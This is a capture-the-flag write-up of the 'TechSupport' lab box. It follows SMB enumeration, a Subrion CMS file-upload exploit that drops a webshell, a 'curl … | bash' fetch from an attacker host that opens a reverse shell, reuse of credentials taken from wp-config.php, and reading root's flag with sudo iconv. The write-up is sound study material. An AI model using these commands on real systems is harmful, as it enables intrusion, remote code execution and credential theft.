# Box Name

## TechSupport

## Overview
---
* [[#Enumeration]]
	* nmap,ferox

* [[#Initial Foothold]]
	* searchsploit,python exploit
	* used webshell to get proper [[revshell]]

* [[#Privilege Escalation]]
	* wp-config.php,su to user

---
## Enumeration
---

- ## smb
	- ### smbmap
	- ### smbclient
```bash
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ smbmap -H 10.10.81.114
[+] Guest session   	IP: 10.10.81.114:445	Name: 10.10.81.114                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	websvr                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (TechSupport server (Samba, Ubuntu))


```

```bash
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ smbclient //10.10.81.114/websvr 
Enter WORKGROUP\scott's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat May 29 02:17:38 2021
  ..                                  D        0  Sat May 29 02:03:47 2021
  enter.txt                           N      273  Sat May 29 02:17:38 2021

		8460484 blocks of size 1024. 5673640 blocks available
smb: \> 

```

```bash
enter.txt

GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->


```

- ## cyberchef
	- ### used magic receipe
![[Pasted image 20220527181917.png]]


- ## /subrion/panel/
	- Subrion CMS v4.2.1

![[Pasted image 20220527185308.png]]

 - ## searchsploit 
	 - #### used the Arbitrary file upload python script
 
```bash 

                                                                                                                                                                                                                                          
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ searchsploit subrion CMS 4.2.1 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                                                                                   | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                                                                                | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                                                                         | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                                                                                 | php/webapps/45150.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                          
```


## Initial Foothold
---
- ## python exploit
```bash
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ python3 exploit.py -u http://10.10.81.114/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.81.114/subrion/panel/
[+] Success!
[+] Got CSRF token: wqKg5At9TXkBTkscK15J1uYTwtPMiJZECM7CCJr6
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: wasmjisiedvnndc

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.81.114/subrion/panel/uploads/wasmjisiedvnndc.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

- ## used webshell to get a reverse shell on the box
	- ### created shell.sh on local machine containing a bash one liner

```bash
"webshell"
$ curl http://10.13.13.55:9001/shell.sh | bash

"local machine"
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.13.13.55] from (UNKNOWN) [10.10.81.114] 59848
bash: cannot set terminal process group (1422): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TechSupport:/var/www/html/subrion/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ww/html/subrion/uploads$ python3 -c 'import pty;pty.spawn("/bin/bash")'     
www-data@TechSupport:/var/www/html/subrion/uploads$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                                                                                                                                                           
┌──(kn1ght㉿Kali)-[~/THM/techsupport]
└─$ stty raw -echo; fg             
[1]  + continued  nc -lnvp 1234

www-data@TechSupport:/var/www/html/subrion/uploads$ export TERM=xterm
www-data@TechSupport:/var/www/html/subrion/uploads$ clear


```


- ### serched for config files found wp-config.php
```bash
/ ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


```



---
## Privilege Escalation

 - ### knowing there is only one user built in the box used wp creds to su to scamsite
 
```bash
www-data@TechSupport:/var/www/html/wordpress$ su scamsite
Password: ImAScammerLOL!123!

scamsite@TechSupport:

```


```bash
scamsite@TechSupport:~$ cat .bash_history 

cd ~
cat /root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
echo "" > .bash_history 
su root
exit
sudo -l
cd ..
cd ~
sudo -l
su root
exit


scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
scamsite@TechSupport:~$ 


```

 - ### using the command found in scamsite's .bash_history cat root.txt
 ```bash
scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -
scamsite@TechSupport:~$ 
```